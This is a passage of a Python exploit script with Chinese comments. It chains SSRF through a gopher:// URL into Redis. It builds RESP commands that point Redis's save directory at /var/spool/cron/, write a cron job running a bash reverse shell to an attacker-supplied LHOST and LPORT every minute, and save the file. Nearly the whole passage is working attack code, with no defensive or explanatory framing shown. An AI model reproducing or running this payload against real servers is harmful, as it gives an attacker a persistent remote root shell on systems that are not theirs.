    f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
)

# Redis 协议（RESP）批量命令：
# CONFIG SET dir /var/spool/cron/
# CONFIG SET dbfilename root
# SET x "\n\n*/1 * * * * <cmd>\n\n"
# SAVE
def resp(*args):
    out = f"*{len(args)}\r\n".encode()
    for a in args:
        a = a.encode() if isinstance(a, str) else a
        out += f"${len(a)}\r\n".encode() + a + b"\r\n"
    return out

raw  = resp("CONFIG", "SET", "dir", "/var/spool/cron/")
raw += resp("CONFIG", "SET", "dbfilename", "root")
raw += resp("SET", "x", f"\n\n*/1 * * * * {payload}\n\n")
raw += resp("SAVE")

gopher = f"gopher://{HOST}:{PORT}/_%0d%0a{enc}"
# 更通用的写法：直接占满 一个请求
gopher = f"gopher://{HOST}:{PORT}/_" + enc.replace("%0A", "%0d%0a")
